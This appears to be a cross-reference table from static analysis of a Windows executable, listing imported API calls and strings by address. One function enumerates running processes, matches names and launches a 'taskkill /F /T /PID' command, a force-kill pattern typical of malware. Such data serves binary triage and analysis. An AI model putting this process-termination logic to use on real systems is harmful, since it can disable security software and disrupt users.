reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4027af	0x4010d0	import	0x4027a9	KERNEL32.dll.GetProcessHeap
0x4027b6	0x4010d4	import	0x4027a9	KERNEL32.dll.HeapAlloc
0x4027c3	0x4010d0	import	0x4027bd	KERNEL32.dll.GetProcessHeap
0x4027ca	0x4010ac	import	0x4027bd	KERNEL32.dll.HeapFree
0x4027dd	0x4010d0	import	0x4027d1	KERNEL32.dll.GetProcessHeap
0x4027e4	0x4010d4	import	0x4027d1	KERNEL32.dll.HeapAlloc
0x4028e3	0x4028f0	string	0x4028de	;t$\fr
0x402938	0x4010d8	import	0x40292c	KERNEL32.dll.GetCommandLineA
0x402941	0x401028	import	0x40292c	KERNEL32.dll.lstrlenA
0x40294c	0x4010d0	import	0x40292c	KERNEL32.dll.GetProcessHeap
0x402953	0x4010d4	import	0x40292c	KERNEL32.dll.HeapAlloc
0x402961	0x402a1c	string	0x40292c	_^][
0x402969	0x40105c	import	0x40292c	KERNEL32.dll.lstrcpynA
0x4029c9	0x402a1c	string	0x40292c	_^][
0x402a10	0x402a1c	string	0x40292c	_^][
0x402b6b	0x402b7b	string	0x402ae0	+D$\f\eT$
0x402b71	0x402b7b	string	0x402ae0	+D$\f\eT$
0x402c71	0x4010b4	import	0x402c4e	KERNEL32.dll.CreateToolhelp32Snapshot
0x402c96	0x4010bc	import	0x402c4e	KERNEL32.dll.Process32FirstW
0x402caa	0x408849	string	0x402c4e	UVW3\v
0x402cb9	0x4010c0	import	0x402c4e	KERNEL32.dll.lstrlenW
0x402cdb	0x4010e4	import	0x402c4e	SHLWAPI.dll.StrStrA
0x402cfd	0x4010cc	import	0x402c4e	KERNEL32.dll.HeapCreate
0x402d0a	0x4010d4	import	0x402c4e	KERNEL32.dll.HeapAlloc
0x402d1f	0x4010f0	import	0x402c4e	USER32.dll.wsprintfA
0x402d2c	0x401ad4	string	0x402c4e	taskkill /F /T /PID
0x402d32	0x40106c	import	0x402c4e	KERNEL32.dll.lstrcpyA
0x402d3e	0x4010c4	import	0x402c4e	KERNEL32.dll.lstrcatA
0x402d61	0x4010c8	import	0x402c4e	KERNEL32.dll.CreateProcessA
0x402d70	0x4010b8	import	0x402c4e	KERNEL32.dll.Process32NextW
0x402d7f	0x4010b0	import	0x402c4e	KERNEL32.dll.CloseHandle
